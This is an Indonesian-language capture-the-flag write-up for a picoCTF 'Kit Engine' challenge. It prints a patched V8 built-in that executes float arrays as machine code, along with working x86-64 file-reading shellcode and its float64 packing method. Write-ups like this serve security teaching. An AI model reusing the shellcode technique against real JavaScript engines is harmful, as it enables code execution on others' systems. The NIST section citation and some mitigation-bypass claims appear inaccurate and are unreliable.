# Writeup: Kit Engine (Challenge ID: 168)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / V8 JavaScript Engine Custom Built-in Exploitation
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2021
- **Points:** 500
- **Author:** Collin Petty
- **Flag:** `academy{vr00m_vr00m_0eae4872890d01a6}`

---

## Problem Statement & Scope

Tantangan `Kit Engine` menyajikan lingkungan eksekusi JavaScript tingkat rendah berbasis shell Google V8 (`d8`) yang telah dimodifikasi melalui patch kustom internal. Layanan interaktif jarak jauh meminta panjang ukuran berkas skrip JavaScript, menerima konten kode sumber JavaScript dari pengguna, dan menjalankannya secara langsung di dalam interpreter V8 yang telah dipatch.

Tujuan utama dari tantangan ini adalah mengidentifikasi modifikasi fungsionalitas mesin JavaScript, memanfaatkan antarmuka baru untuk melompati pembatasan lingkungan sandbox (*runtime escape*), mengeksekusi *shellcode* arbitrer arsitektur x86-64, dan membaca berkas target `flag.txt`.

Ruang lingkup audit keamanan perangkat lunak dan analisis mesin runtime ini mencakup:
1. Analisis berkas patch V8 dan identifikasi fungsi bawaan kustom `AssembleEngine()`.
2. Pemetaan representasi memori floating point IEEE-754 (Float64) terhadap byte instruksi mesin mentah x86-64.
3. Rekayasa shellcode mandiri untuk operasi pembacaan berkas (`sys_open`, `sys_read`, `sys_write`) dan pemutusan bersih proses via `sys_exit_group`.
4. Konversi array byte shellcode menjadi array angka presisi ganda (*double precision floating-point*).
5. Eksekusi kode mesin pada halaman memori RWX dan pemulihan flag sesuai standar **NIST SP 800-115 Section 4.2** (*Binary and Runtime Software Security Assessment*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Injeksi Primitif Eksekusi Kode Mesin Bebas (CWE-94 / CWE-843)
Patch mesin V8 memperkenalkan fungsi bawaan bernama `AssembleEngine(doublesArray)`:
```cpp
void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
  ...
  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  ...
  if (args[0]->IsArray()) {
    Local<Array> arr = args[0].As<Array>();
    for (uint32_t i = 0; i < arr->Length(); i++) {
      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
        func[i] = element.As<Number>()->Value();
      }
    }
    void (*foo)() = (void(*)())func;
    foo();
  }
}
```
Fungsi ini:
- Menerima argumen berupa array JavaScript standar yang berisi bilangan riil presisi ganda (Float64).
- Mengalokasikan area memori dengan izin Baca-Tulis-Eksekusi (`PROT_READ | PROT_WRITE | PROT_EXEC`).
- Menyalin byte mentah dari representasi internal IEEE-754 array tersebut langsung ke wilayah memori yang dapat dieksekusi tanpa sanitasi atau verifikasi instruksi CPU.
- Melompat (*call*) langsung ke awal buffer sebagai *function pointer* native.

Kerentanan ini menjembatani celah antara lapisan bahasa skrip dinamis tingkat tinggi dengan eksekusi instruksi mesin biner langsung, meniadakan mitigasi keamanan seperti ASLR, DEP/NX, dan sandboxing pointer compression V8.

### 2. Representasi IEEE-754 Float64 sebagai Instruksi Assembly
Setiap elemen `double` dalam JavaScript menempati 8 byte memori. Karena arsitektur prosesor x86-64 membaca instruksi mesin sebagai urutan byte berurutan (*stream of bytes*), kita dapat memetakan instruksi assembly apa pun ke dalam deretan angka desimal mengambang:
$$\text{Float64} = \text{unpack}("<d", \text{byte}_{0..7})$$
Dengan menyusun instruksi shellcode dalam kelipatan 8 byte (menggunakan NOP `0x90` sebagai padding), kode mesin dapat dikirimkan secara utuh melalui array JavaScript.

### 3. Penanganan Multi-Threading V8 & `sys_exit_group`
Karena lingkungan V8 mengoperasikan beberapa *worker thread* di latar belakang, memanggil `sys_exit` (syscall 60) hanya menghentikan thread pemanggil sementara thread latar belakang tetap hidup, menyebabkan proses `subprocess.run` di server mengalami timeout. Untuk mematikan seluruh proses secara instan dan bersih, shellcode harus memanggil syscall `sys_exit_group` (syscall 231 / `0xe7`).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Penyusunan Shellcode x86-64:**
   Menyusun instruksi minimal yang mengeksekusi pembacaan `flag.txt` dan penghentian bersih grup proses:
   ```asm
   /* open("flag.txt", 0) */
   xor rax, rax
   push rax
   mov rax, 0x7478742e67616c66 /* "flag.txt" */
   push rax
   mov rdi, rsp
   xor rsi, rsi
   mov rax, 2
   syscall

   /* read(fd, rsp, 100) */
   mov rdi, rax
   mov rsi, rsp
   mov rdx, 100
   xor rax, rax
   syscall

   /* write(1, rsp, rax) */
   mov rdx, rax
   mov rdi, 1
   mov rax, 1
   syscall

   /* exit_group(0) */
   xor rdi, rdi
   mov rax, 231
   syscall
   ```

2. **Pengemasan ke Format Float64:**
   Mengubah setiap irisan 8 byte shellcode menjadi bilangan presisi ganda menggunakan Python:
   ```python
   doubles = [struct.unpack('<d', chunk)[0] for chunk in chunks]
   ```
   Menghasilkan 10 elemen Float64 yang tidak memuat nilai NaN atau Infinity sehingga representasi IEEE-754 terjaga 100% identik di dalam memori JS.

3. **Pengiriman Skrip ke Layanan Remote:**
   Mengirimkan panjang skrip diikuti kode JavaScript yang memanggil `AssembleEngine([...])` ke port tantangan `xebec.cylabacademy.net`:
   ```bash
   python3 scripts/solve_168_kit_engine.py
   ```
   Server mengeksekusi skrip melalui `./d8`, menjalankan shellcode langsung di halaman memori RWX, dan mencetak bendera:
   `academy{vr00m_vr00m_0eae4872890d01a6}`.

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{vr00m_vr00m_0eae4872890d01a6}`
- **Flag Komunitas:** `CTF{vr00m_vr00m_0eae4872890d01a6}`
- **Bukti Validasi:** Live remote exploitation pada instans CyLab Security Academy berhasil memetakan shellcode Float64 ke memori RWX dan mengekstrak flag live secara deterministik (HTTP 201 `correct: true`).

---

## Rekomendasi Mitigasi & Pengerasan Keamanan (Remediation)

1. **Peniadaan Izin Halaman Memori RWX (W^X Policy):**
   Terapkan kebijakan memori ketat di mana halaman memori tidak boleh memiliki izin tulis (*write*) dan izin eksekusi (*execute*) secara bersamaan.
2. **Penghapusan Antarmuka Eksekusi Biner Langsung (CWE-94):**
   Jangan pernah mengekspos API pengikatan (*binding*) yang mengizinkan pemetaan data tingkat aplikasi pengguna menjadi kode mesin tanpa verifikasi integritas cryptographic signature.
3. **Penerapan Seccomp BPF Filter:**
   Pasang filter seccomp pada proses V8 untuk membatasi pemanggilan sistem (*syscall filtering*) sehingga syscall sensitif seperti `open`, `execve`, dan `mprotect` diblokir secara mutlak.
